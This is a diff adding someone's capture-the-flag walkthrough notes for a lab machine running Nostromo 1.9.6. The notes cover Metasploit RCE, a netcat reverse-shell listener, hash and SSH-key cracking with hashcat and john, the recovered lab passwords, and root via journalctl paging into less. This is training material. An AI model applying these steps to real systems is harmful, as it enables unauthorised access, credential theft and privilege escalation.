@@ -1,0 +1,39 @@
+Nmap results showed a Nostromo server (version 1.9.6) and SSH
+Searchsploit showed a remote command execution vulnerability in Nostromo <= 1.9.6 (Unauthenticated RCE)
+Steps:
+	- msfconsole, search nostromo, use ..., RHOSTS to 10.10.10.165 LHOST to tun0 IP, run
+	- whoami: www-data
+Achieve a reverse shell. Make it proper by running
+	- nc -lvnp 4444 (local)
+	- python reverse shell (remote)
+	- python -c 'import pty;pty.spawn("/bin/bash")'
+	- CTRL-Z
+	- stty raw -echo
+	- fg + ENTER
+Looked at /etc/passwd - Nothing interesting (just that there's an user named david)
+Looked in nostromo foler (/var/nostromo)
+	- Found a hash in conf/.htpasswd
+	- It was an MD5Crypt (you can know this by using https://hashcat.net/wiki/doku.php?id=example_hashes)
+		- Also running # hashid 'hash'
+	- The result of cracking it with hashcat was Nowonly4me
+		- # hashcat -m 500 hash.hash rockyou.txt --force
+	- This wasn't the ssh passwd of user david
+Looked at /etc - Nothing interesting
+Ran linpeas/linenum (set up server python3 -m http.server 8080) - Nothing interesting
+Looked at /var/backups - Nothing interesting
+Looked at bin folders - Nothing interesting
+Found some ssh keys in /tmp folder
+	- This was actually cheating, since it seems people use that folder as copying environment
+After reading the doc on nostromo, it seems that when there's certain configuration, it creates a public_www folder in the home folder of the user, so you just have to run # cd /home/david/public_www
+	- There are some files of interest there, specially backup.tgz. Using zcat, you can see it's the ssh keys.
+	- The private key is encrypted. To decrypt:
+		- # python /usr/share/john/ssh2john.py id_rsa > idcrackfile
+		- # john idcrackfile
+	- The passwd is hunter
+	- # openssl rsa -check -noout -in id_rsa (input passwd to verify)
+	- # ssh -i id_rsa david@...
+Now we have user
+In david's home folder, there are some scripts. One of them runs sudo journalctl -n5 -unostromo.service without having the password for sudo.
+There's clearly an exception in the sudoers file
+Journalctl uses less (take a look at GTFObins)
+To achieve root, reduce the size of the terminal so the 5 lines that journalctl prints makes it necessary to use less, then write !/bin/sh to achieve a root console
